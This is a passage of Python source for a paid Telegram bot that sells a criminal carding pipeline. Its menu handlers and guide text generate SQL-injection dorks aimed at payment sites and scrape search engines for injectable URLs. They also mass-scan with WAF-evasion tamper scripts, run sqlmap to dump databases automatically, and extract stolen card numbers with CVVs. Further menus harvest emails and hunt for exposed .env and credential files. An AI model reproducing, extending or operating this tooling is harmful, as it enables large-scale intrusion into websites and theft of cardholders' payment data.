            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "💡 Hᴏᴡ Mᴀɴʏ Dᴏʀᴋs Tᴏ ɢᴇɴᴇʀᴀᴛᴇ ?\n"
            "_(e.g. `1 ` — max 1,000,000)_",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return DORK_WAIT_COUNT

    # ── Pro Dork Generator ────────────────────────────────────────────────────
    elif data == "menu_adorks":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        cfg = adork_get_cfg(context)
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🧞‍♂️ 𝘾𝙪𝙨𝙩𝙤𝙢 𝘿𝙤𝙧𝙠 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙤𝙧\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "💡 Usᴇ Cᴏᴍᴍᴀɴᴅs:\n"
            "`/dkeywords` — Sᴇᴛ Kᴇʏᴡᴏʀᴅs\n"
            "`/ddomains` — Sᴇᴛ Dᴏᴍᴀɪɴ Exᴛᴇɴsɪᴏɴs (.com .ru)\n"
            "`/dparams` — Sᴇᴛ URL Pᴀʀᴀᴍᴇᴛᴇʀs (id, cat, page)\n"
            "`/dfiletypes` — Sᴇᴛ Fɪʟᴇ Tʏᴘᴇs (.php .asp)\n"
            "`/dsf` — Sᴇᴛ Sᴇᴀʀᴄʜ Fɪʟᴛᴇʀs (inurl: intitle:)\n"
            "`/dpf` — Sᴇᴛ Pᴀɢᴇ Pʀᴇғɪxᴇs (index view page)\n"
            "`/dconfig` — Tᴏɢɢʟᴇ Tᴇᴍᴘʟᴀᴛᴇs\n"
            "`/dstatus` — Vɪᴇᴡ Cᴜʀʀᴇɴᴛ: Sᴇᴛᴛɪɴɢs\n"
            "`/dreset` — Rᴇsᴇᴛ Tᴏ Dᴇғᴀᴜʟᴛs\n"
            "`/dgenerate` — Gᴇɴᴇʀᴀᴛᴇ Aʟʟ Cᴏᴍʙɪɴᴀᴛɪᴏɴs\n"
            "`/dgen <X>` — Gᴇɴᴇʀᴀᴛᴇ X Dᴏʀᴋs\n\n"
            f"• *Cᴜʀʀᴇɴᴛ:* `{len(cfg['keywords'])}` Kᴇʏᴡᴏʀᴅs | "
            f"`{len(cfg['enabled'])}/10` Tᴇᴍᴘʟᴀᴛᴇs Aᴄᴛɪᴠᴇ",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data.startswith("adork_tgl_"):
        tid = data[len("adork_tgl_"):]
        cfg = adork_get_cfg(context)
        enabled = set(cfg["enabled"])
        if tid in enabled:
            enabled.discard(tid)
        else:
            enabled.add(tid)
        cfg["enabled"] = list(enabled)
        await query.edit_message_reply_markup(_adork_template_keyboard(enabled))
        return MENU

    elif data == "adork_all_on":
        cfg = adork_get_cfg(context)
        cfg["enabled"] = list(_ADORK_TEMPLATES.keys())
        await query.edit_message_reply_markup(_adork_template_keyboard(set(cfg["enabled"])))
        return MENU

    elif data == "adork_all_off":
        cfg = adork_get_cfg(context)
        cfg["enabled"] = []
        await query.edit_message_reply_markup(_adork_template_keyboard(set()))
        return MENU

    elif data == "adork_cfg_done":
        cfg = adork_get_cfg(context)
        await query.edit_message_text(
            f"✅ *Cᴏɴғɪɢ Sᴀᴠᴇᴅ!* `{len(cfg['enabled'])}/10` Tᴇᴍᴘʟᴀᴛᴇs Aᴄᴛɪᴠᴇ.\n\n"
            "💡 Usᴇ `/dgenerate` (Aʟʟ Cᴏᴍʙᴏs) or `/dgen <X>` (Rᴀɴᴅᴏᴍ X).",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Bᴀᴄᴋ", callback_data="menu_adorks")],
            ]),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    # ── HQ SQLi Dorks ─────────────────────────────────────────────────────────
    elif data == "menu_hqdorks":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        context.user_data["dork_type"] = "hq"
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🐊 𝙂𝙚𝙣 𝙃𝙌 𝙎𝙦𝙡𝙞-𝘿𝙤𝙧𝙠𝙨\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "🎯 Gᴇɴᴇʀᴀᴛᴇs Tᴀʀɢᴇᴛᴇᴅ-Bᴀsᴇᴅ Sǫʟɪ Dᴏʀᴋs:\n"
            "  • SQL Eʀʀᴏʀ-Bᴀsᴇᴅ Dᴏʀᴋs\n"
            "  • Pᴀʏᴍᴇɴᴛ/CC Tᴀʀɢᴇᴛᴇᴅ Pᴀᴛᴛᴇʀɴs\n"
            "  • Mᴜʟᴛɪ-Exᴛᴇɴsɪᴏɴs (PHP/ASPX/ASP/JSP)\n"
            "  • Cᴏᴜɴᴛʀʏ Tᴀʀɢᴇᴛɪɴɢ\n"
            "  • CMS-Sᴘᴇᴄɪғɪᴇᴅ Pᴀᴛᴛᴇʀɴs\n\n"
            "💡 Yᴏᴜʀ Wɪsʜ Fᴏʀ HQ Dᴏʀᴋs? _(e.g. `10000`)_",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return DORK_WAIT_COUNT

    # ── Country Dorks ─────────────────────────────────────────────────────────
    elif data == "menu_countrydorks":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        context.user_data["dork_type"] = "country"
        country_list = ", ".join(COUNTRY_SITES[:10]) + "..."
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🌍 𝙂𝙚𝙣 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-𝙏𝙖𝙧𝙜𝙚𝙩𝙚𝙙 𝘿𝙤𝙧𝙠𝙨\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"🎯 Tᴀʀɢᴇᴛs: `{country_list}`\n\n"
            "_40 Cᴏᴜɴᴛʀʏ TLDs — Hɪɢʜᴇsᴛ SQLi Dᴇɴsɪᴛʏ Rᴇɢɪᴏɴs._\n\n"
            "💡 Yᴏᴜʀ Wɪsʜ Fᴏʀ Cᴏᴜɴᴛʀʏ Bᴀsᴇᴅ Dᴏʀᴋs? _(e.g. `5000`)_",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return DORK_WAIT_COUNT

    # ── CMS Dorks ─────────────────────────────────────────────────────────────
    elif data == "menu_cmsdorks":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        context.user_data["dork_type"] = "cms"
        cms_list = ", ".join(CMS_DORKS.keys())
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🕸️ 𝘾𝙈𝙎-𝙎𝙥𝙚𝙘𝙞𝙛𝙞𝙚𝙙 𝘿𝙤𝙧𝙠𝙨\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"🎯 CMS Tᴀʀɢᴇᴛʟɪsᴛ: `{cms_list}`\n\n"
            "_Eᴀᴄʜ CMS Hᴀs Uɴɪǫᴜᴇ SQLi-Pʀᴏɴᴇ URL Pᴀᴛᴛᴇʀɴs._\n\n"
            "💡 Yᴏᴜʀ Wɪsʜ Fᴏʀ CMS Bᴀsᴇᴅ Dᴏʀᴋs? _(e.g. `5000`)_",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return DORK_WAIT_COUNT

    # ── Exposed File Dorks ────────────────────────────────────────────────────
    elif data == "menu_exposeddorks":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        context.user_data["dork_type"] = "exposed"
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🧥︎ 𝙂𝙚𝙣 𝙀𝙭𝙥𝙤𝙨𝙚𝙙-𝙁𝙞𝙡𝙚 𝘿𝙤𝙧𝙠𝙨\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "📒 Dᴜᴍᴘs Exᴘᴏsᴇᴅ Sᴇɴsɪᴛᴠᴇ Fɪʟᴇs:\n"
            "  • `.env` (DB Pᴀssᴡᴏʀᴅs, API Kᴇʏs)\n"
            "  • `.sql` Dᴜᴍᴘs (INSERT INTO...)\n"
            "  • Cᴏɴғɪɢ Fɪʟᴇs (Wᴘ-Cᴏɴғɪɢ, Sᴇᴛᴛɪɴɢs)\n"
            "  • Lᴏɢ Fɪʟᴇs Wɪᴛʜ Cʀᴇᴅᴇɴᴛɪᴀʟs\n"
            "  • Bᴀᴄᴋᴜᴘ Aʀᴄʜɪᴠᴇs\n"
            "  • PʜᴘMʏAᴅᴍɪɴ Pᴀɴᴇʟs\n\n"
            "💡 Yᴏᴜʀ Wɪsʜ Fᴏʀ Dᴏʀᴋs? _(e.g. `2000`)_",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return DORK_WAIT_COUNT

    # ── Deep Parser ───────────────────────────────────────────────────────────
    elif data == "menu_parser":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "︎🦡 𝘿𝙚𝙚𝙥 𝙋𝙖𝙧𝙨𝙚𝙧 — 𝙐𝙍𝙇 𝙎𝙘𝙧𝙖𝙥𝙥𝙚𝙧\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "🔍 *Sᴇᴀʀᴄʜ Eɴɢɪɴᴇs Aᴄᴛɪᴠᴇ:*\n"
            "  • Bɪɴɢ (SWIFT-Sᴛʏʟᴇ, Wᴇɪɢʜᴛᴇᴅ 4x)\n"
            "  • DDGS / DᴜᴄᴋDᴜᴄᴋGᴏ (Lɪʙʀᴀʀʏ)\n"
            "  • DDG HTML (Lɪᴛᴇ + Hᴛᴍʟ Eɴᴅᴘᴏɪɴᴛs)\n"
            "  • Yᴀɴᴅᴇx (Gʀᴇᴀᴛ Fᴏʀ Dᴇʟɪsᴛᴇᴅ Cᴏɴᴛᴇɴᴛ)\n"
            "  • Asᴋ.ᴄᴏᴍ\n\n"
            "🗺️ *Dᴏᴍᴀɪɴ Dɪᴠᴇʀsɪᴛʏ:* Mᴀx 5 URLs Pᴇʀ Dᴏᴍᴀɪɴ\n"
            "🏆 *Qᴜᴀʟɪᴛʏ Sᴄᴏʀɪɴɢ:* PHP/ASPX + Pᴀʀᴀᴍs Fɪʀsᴛ\n\n"
            "💡 Pᴀsᴛᴇ Yᴏᴜʀ Dᴏʀᴋs:\n"
            "» A `.txt` Fɪʟᴇ (Oɴᴇ Dᴏʀᴋ Pᴇʀ Lɪɴᴇ)\n"
            "» Pᴀsᴛᴇ Dᴏʀʟs Dɪʀᴇᴄᴛʟʏ Iɴ Cʜᴀᴛ\n\n"
            "_Aʟʟ URL Tʏᴘᴇs Aʀᴇ Sᴜᴘᴘᴏʀᴛᴇᴅ. Rᴇᴀʟ URLs Oɴʟʏ._",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return PARSER_WAIT_DORKS

    # ── SQLi Scanner ──────────────────────────────────────────────────────────
    elif data == "menu_sqli":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "💉︎ 𝙎𝙦𝙡𝙞 𝙑𝙪𝙡𝙣 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "• Uᴘʟᴏᴀᴅ `.txt` Fɪʟᴇ Wɪᴛʜ URLs Tᴏ Cʜᴇᴄᴋ.\n"
            "• Eᴀᴄʜ URL Sʜᴏᴜʟᴅ Hᴀᴠᴇ Pᴀʀᴀᴍᴇᴛᴇʀs (e.g. `?id=1`).\n"
            "💡 ︎*Exᴀᴍᴘʟᴇ URLs:*\n"
            "`https://site.com/page.php?id=1`\n"
            "`https://site.com/item.php?cat=5`\n\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "• *Tʜʀᴇᴀᴅs:* 100 Cᴏɴᴄᴜʀʀᴇɴᴛ\n"
            "• *Dᴇᴛᴇᴄᴛs:* Eʀʀᴏʀ-Bᴀsᴇᴅ + UNION-Bᴀsᴇᴅ Iɴᴊᴇᴄᴛɪᴏɴ\n"
            "• *Dᴀᴛᴀʙᴀsᴇs:* MʏSQL, PᴏsᴛɢʀᴇSQL, MSSQL, Oʀᴀᴄʟᴇ, SQLɪᴛᴇ\n"
            "• *Bʏᴘᴀss Vɪᴀ:* WAF Eᴠᴀsɪᴏɴ Wɪᴛʜ Tᴀᴍᴘᴇʀ Sᴄʀɪᴘᴛs\n"
            "• *Sᴘᴇᴇᴅ:* Asʏɴᴄ Sᴄᴀɴɴɪɴɢ — 800 URLs Pᴇʀ Bᴀᴛᴄʜ\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "💡 *Sᴇɴᴅ URLs As:*\n"
            "  › `.txt` Fɪʟᴇ _(Oɴᴇ Uʀʟ Pᴇʀ Lɪɴᴇ)_\n"
            "  › Oʀ Pᴀsᴛᴇ Dɪʀᴇᴠᴛʟʏ Iɴ Cʜᴀᴛ \n\n"
            "_Vᴜʟɴ URLs Gᴏ Sᴛʀᴀɪɢʜᴛ Iɴᴛᴏ Dᴜᴍᴘ Pɪᴘᴇʟɪɴᴇ..!_",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return SQLI_WAIT_URLS

    # ── Dorks ➪ DB Dump ───────────────────────────────────────────────────────
    elif data == "menu_dump":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        o = _get_sqlopts(user_id)
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "︎🧞‍♂️ 𝘿𝙊𝙍𝙆𝙎 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🐎 *Fᴀsᴛᴇsᴛ Aᴜᴛᴏᴍᴀᴛᴇᴅ Pɪᴘᴇʟɪɴᴇ:*\n"
            "  `1`  Pᴀʀsᴇ Dᴏʀᴋs ➪ Sᴄʀᴀᴘ URLs\n"
            "  `2`  Tᴇsᴛ URLs Fᴏʀ SQLi\n"
            "  `3`  Sǫʟ-Mᴀᴘ Dᴜᴍᴘs Dᴀᴛᴀʙᴀsᴇ\n"
            "  `4`  CC Exᴛʀᴀᴄᴛɪᴏɴ + Dᴇʟɪᴠᴇʀʏ\n\n"
            "💡 *Sᴇɴᴅ Dᴏʀᴋs As:*\n"
            "  › `.txt` Fɪʟᴇ  _(Oɴᴇ Dᴏʀᴋ Pᴇʀ Lɪɴᴇ)_\n"
            "  › Pᴀsᴛᴇ Dɪʀᴇᴄᴛʟʏ Iɴ Cʜᴀᴛ\n\n"
            f"⚙️ Eɴɢɪɴᴇ: *{'REST API' if o['engine']=='api' else 'Subprocess'}*  "
            f"│  L{o['level']}R{o['risk']}  │  {o['technique']}\n\n",
            reply_markup=make_dump_start_menu(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return DUMP_WAIT_DORKS

    # ── URLs ➪ DB Dump ────────────────────────────────────────────────────────
    elif data == "menu_urldump":
        if not has_access(user_id):
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Bᴜʏ A Pʟᴀɴ Tᴏ Pʀᴏᴄᴇᴇᴅ.", show_alert=True)
            return MENU
        o = _get_sqlopts(user_id)
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🧞‍♂️︎ 𝙐𝙍𝙇𝙨 ➪ 𝘿𝘽 𝘿𝙪𝙢𝙥\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "⏩ *Sᴋɪᴘ Pʜᴀsᴇ 1 — Dɪʀᴇᴄᴛ URL Iɴᴊᴇᴄᴛɪᴏɴ:*\n"
            "  `2`  Tᴇsᴛ Eᴀᴄʜ URL Fᴏʀ SQLɪ\n"
            "  `3`  Sǫʟ-Mᴀᴘ Dᴜᴍᴘs Dᴀᴛᴀʙᴀsᴇs\n"
            "  `4`  CC Exᴛʀᴀᴄᴛɪᴏɴ + Dᴇʟɪᴠᴇʀʏ\n\n"
            "💡 *Sᴇɴᴅ URLs As:*\n"
            "  › `.txt` Fɪʟᴇ  _(Oɴᴇ Uʀʟ Pᴇʀ Lɪɴᴇ)_\n"
            "  › Pᴀsᴛᴇ Dɪʀᴇᴄᴛʟʏ Iɴ Cʜᴀᴛ\n\n"
            f"⚙️ Eɴɢɪɴᴇ: *{'REST API' if o['engine']=='api' else 'Subprocess'}*  "
            f"│  L{o['level']}R{o['risk']}  │  {o['technique']}\n\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "_Wᴏʀᴋs Fᴀsᴛᴇʀ Wɪᴛʜ Lᴀʀɢᴇ URL Fɪʟᴇs (1K–10K)_",
            reply_markup=make_urldump_start_menu(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return URL_DUMP_WAIT

    # ── Purchase ──────────────────────────────────────────────────────────────
    elif data == "menu_emails":
        if not has_access(user_id):
            await query.answer("❌ Access denied", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "📧 𝙀𝙢𝙖𝙞𝙡 𝙃𝙖𝙧𝙫𝙚𝙨𝙩𝙚𝙧\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "📎 *How to use:*\n"
            "Send any `.txt` file to the bot\n"
            "then reply to it with `/emails`\n\n"
            "📧 Extracts all emails from file\n"
            "Supports: Gmail, Yahoo, Hotmail,\n"
            "Outlook, iCloud, ProtonMail + all\n\n"
            "💡 Also works automatically after\n"
            "every parser run — emails auto-sent!",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Mᴀɪɴ Mᴇɴᴜ", callback_data="menu_back")],
            ]),
        )
        return MENU

    elif data == "menu_statuscheck":
        if not has_access(user_id):
            await query.answer("❌ Access denied", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "⚡ Sᴛᴀᴛᴜs Fɪʟᴛᴇʀ\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "📎 *How to use:*\n"
            "Send a `.txt` URLs file to the bot\n"
            "then reply to it with `/statuscheck`\n\n"
            "✅ Keeps: HTTP 200, 301, 302, 500\n"
            "❌ Removes: 404, 403, timeouts\n\n"
            "💡 Run this on parser output before\n"
            "injector — skips dead URLs, 3-4x faster!",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Mᴀɪɴ Mᴇɴᴜ", callback_data="menu_back")],
            ]),
        )
        return MENU

    elif data == "menu_aigen":
        if not has_access(user_id):
            await query.answer("❌ Access denied", show_alert=True)
            return MENU
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🤖 𝘼𝙄 𝙆𝙚𝙮𝙬𝙤𝙧𝙙𝙨 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙤𝙧\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "📝 *How to use:*\n"
            "`/aigen email dump keywords`\n"
            "`/aigen hacking forums dorks`\n"
            "`/aigen login panels sqli`\n\n"
            "🤖 *Providers:*\n"
            "🔵 Claude — Anthropic\n"
            "🟢 Gemini — Google (free tier)\n"
            "🟡 GPT-4o — OpenRouter\n"
            "🟣 LLaMA 3.1 — FREE\n"
            "🔴 DeepSeek R1 — FREE\n\n"
            "📊 Generates 600+ keywords as file",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Mᴀɪɴ Mᴇɴᴜ", callback_data="menu_back")],
            ]),
        )
        return MENU

    elif data == "menu_dedup":
        if not has_access(user_id):
            await query.answer("❌ Access denied", show_alert=True)
            return MENU
        _sc = len(_SCANNED_URLS) if "_SCANNED_URLS" in globals() else 0
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🔁 Sᴍᴀʀᴛ Dᴇᴅᴜᴘ Sᴛᴀᴛᴜs\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            f"🌐 Scanned URL DB: `{_sc:,}` entries\n\n"
            "💡 *What it does:*\n"
            "Every parsed URL is saved globally.\n"
            "Next parser run — already-seen URLs\n"
            "are automatically skipped.\n\n"
            "No wasted scans on same targets twice.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Mᴀɪɴ Mᴇɴᴜ", callback_data="menu_back")],
            ]),
        )
        return MENU

    elif data == "menu_purchase":
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "🍷 𝙋𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙇𝙞𝙘𝙚𝙣𝙨𝙚\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "🎖️ Cʜᴏᴏsᴇ Pʟᴀɴ Tᴏ Vɪᴇᴡ Pʀɪᴄɪɴɢ.\n"
            f"🧛🏻 Aᴅᴍɪɴ Hᴇʀᴇ: {ADMIN_USERNAME}",
            reply_markup=make_purchase_menu(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return PURCHASE_MENU

    # ── Help ──────────────────────────────────────────────────────────────────
    elif data == "menu_guide":
        guide_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📕 Fᴜʟʟ Pɪᴘᴇʟɪɴᴇ (Dᴏᴋʀs➪CC)", callback_data="guide_pipeline")],
            [InlineKeyboardButton("📗︎ Hᴏᴡ Tᴏ Dᴜᴍᴘ Dᴀᴛᴀʙᴀsᴇ",   callback_data="guide_dump")],
            [InlineKeyboardButton("📘 Hᴏᴡ Tᴏ Exᴛʀᴀᴄᴛ CC/Dᴀᴛᴀ",   callback_data="guide_cc")],
            [InlineKeyboardButton("📙︎ Sǫʟ-Mᴀᴘ Sᴇᴛᴛɪɴɢs Gᴜɪᴅᴇ",    callback_data="guide_sqlopts")],
            [InlineKeyboardButton("◀ Main Menu",                 callback_data="menu_back")],
        ])
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n"
            "︎🕷️ 𝙎𝙥𝙞𝙙𝙚𝙮 𝘽𝙤𝙩 — 𝙃𝙤𝙬 𝙏𝙤 𝙐𝙨𝙚?\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
            "🚸 Sᴇʟᴇᴄᴛ A Tᴏᴘɪᴄ Bᴇʟᴏᴡ Tᴏ Lᴇᴀʀɴ:\n\n"
            "📕︎ *Fᴜʟʟ Pɪᴘᴇʟɪɴᴇ* — Dᴏʀᴋs Tᴏ CC Iɴ Oɴᴇ Fʟᴏᴡ\n"
            "📗 *DB Dᴜᴍᴘ* — Sᴛᴇᴘ-Bʏ-Sᴛᴇᴘ Dᴀᴛᴀʙᴀsᴇ Dᴜᴍᴘɪɴɢ\n"
            "📘 *CC Exᴛʀᴀᴄᴛɪᴏɴ* — Exᴛʀᴀᴄᴛɪɴɢ Cᴀʀᴅs Fʀᴏᴍ Dᴜᴍᴘs\n"
            "📙 *Sǫʟ-Mᴀᴘ Sᴛᴛɪɴɢs* — Lᴇᴠᴇʟ, Rɪsᴋ, Tᴀᴍᴘᴇʀ, Tʜʀᴇᴀᴅs, Eᴛᴄ",
            reply_markup=guide_kb,
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    elif data == "guide_pipeline":
        await query.edit_message_text(
            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            "📕︎ 𝙁𝙪𝙡𝙡 𝙋𝙞𝙥𝙚𝙡𝙞𝙣𝙚 𝙂𝙪𝙞𝙙𝙚 — 𝘿𝙤𝙧𝙠𝙨 ➪ 𝘾𝘾\n"
            "✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
            "*🗼 Sᴛᴇᴘ 1️⃣ — Gᴇɴᴇʀᴀᴛᴇ Kᴇʏᴡᴏʀᴅs*\n"
            "  ➪ Usᴇ Kᴇʏᴡᴏʀᴅ Gᴇɴᴇʀᴀᴛᴏʀ`\n"
            "  ➪ Eɴᴛᴇʀ Kᴇʏᴡᴏʀᴅs As Yᴏᴜ Wɪsʜ (e.g. 50)\n"
            "  ➪ Eɴᴛᴇʀ Sᴇᴇᴅ Wᴏʀᴋs Lɪᴋᴇ: (`shop, buy, checkout, payment`)\n"
            "  ➪ Bᴏᴛ Gᴇɴᴇʀᴀᴛᴇs Tᴀʀɢᴇᴛᴇᴅ E-ᴄᴏᴍᴍᴇʀᴄᴇ Kᴇʏᴡᴏʀᴅs\n\n"
            "*🗼 Sᴛᴇᴘ 2️⃣ — Gᴇɴᴇʀᴀᴛᴇ Dᴏʀᴋs*\n"
            "  ➪ Usᴇ Nᴏʀᴍᴀʟ Dᴏʀᴋ Gᴇɴᴇʀᴀᴛᴏʀ OR Dᴏʀᴋ Gᴇɴᴇʀᴀᴛᴏʀ V2\n"
            "  ➪ Eɴᴛᴇʀ Cᴏᴜɴᴛ (200–500 Rᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ)\n"
            "  ➪ Sᴇɴᴅ Tʜᴇ Kᴇʏᴡᴘʀᴅs Fʀᴏᴍ Sᴛᴇᴘ 1\n"
            "  ➪ Bᴏᴛ Bᴜɪʟᴅs SQLi Dᴏʀᴋs Wɪᴛʜ `?id=`, `?cat=`, etc.\n"
            "  ➪ Fᴏʀ CC Sɪᴛᴇs Usᴇ `HQ SQLɪ Dᴏʀᴋs` (Pᴀʏᴍᴇɴᴛ-Tᴀʀɢᴇᴛᴇᴅ)\n\n"
            "*🗼 Sᴛᴇᴘ 3️⃣ — Pᴀʀsᴇ Rᴇᴀʟ URLs*\n"
            "  ➪ Usᴇ `Dᴇᴇᴘ Uʀʟ Pᴀʀsᴇʀ`\n"
            "  ➪ Sᴇɴᴅ Tʜᴇ Dᴏʀᴋs Fʀᴏᴍ Sᴛᴇᴘ 2\n"
            "  ➪ Bᴏᴛ Pᴀʀsᴇs Usɪɴɢ Bing, Yandex, DDG, Ask, Eᴛᴄ Eɴɢɪɴᴇs\n"
            "  ➪ Rᴇᴛᴜʀɴs Rᴇᴀʟ Iɴᴊᴇᴄᴛᴀʙʟᴇ URLs (e.g. site.com/product.php?id=1)\n\n"
            "*🗼 Sᴛᴇᴘ 4️⃣ — Fᴜʟʟ Dᴜᴍᴘ Pɪᴘᴇʟɪɴᴇ*\n"
            "  ➪ Usᴇ `Dᴏʀᴋs ➪ DB Dᴜᴍᴘ`\n"
            "  ➪ Sᴇɴᴅ Yᴏᴜʀ Dᴏʀᴋs (Bᴏᴛ Sᴄʀᴀᴘ URLs + Sᴄᴀɴs + Dᴜᴍᴘs Iɴ Oɴᴇ Sʜᴏᴛ)\n"
            "  ➪ Oʀ Usᴇ  `URLs ➪ DB Dᴜᴍᴘ` Aɴᴅ Sᴇɴᴅ Tʜᴇ URLs Fʀᴏᴍ Sᴛᴇᴘ 3\n"
            "  ➪ Bᴏᴛ Rᴜɴs Sǫʟᴍᴀᴘ Aᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ Oɴ Eᴀᴄʜ URL\n"
            "  ➪ Sᴇɴᴅs Dᴀᴛᴀ As ZIP Pᴇʀ Sɪᴛᴇ + CC Fɪʟᴇ Aᴛ Tʜᴇ Eɴᴅ\n\n"
            "📤 *Oᴜᴛᴘᴜᴛ Fᴏʀᴍᴀᴛ:* `4532XXXX|12|27|456`\n"
            " • `card_number|month|year|cvv`\n"
            "💡 *Nᴏᴛᴇ:* Usᴇ `HQ SQLi Dᴏʀʟs` + `Dᴏʀᴋs ➪ DB Dᴜᴍᴘ`\n"
            " • `Fᴏʀ Tʜᴇ Hɪɢʜᴇsᴛ CC Dᴜᴍᴘ Rᴀᴛᴇ.´",
            reply_markup=InlineKeyboardMarkup([
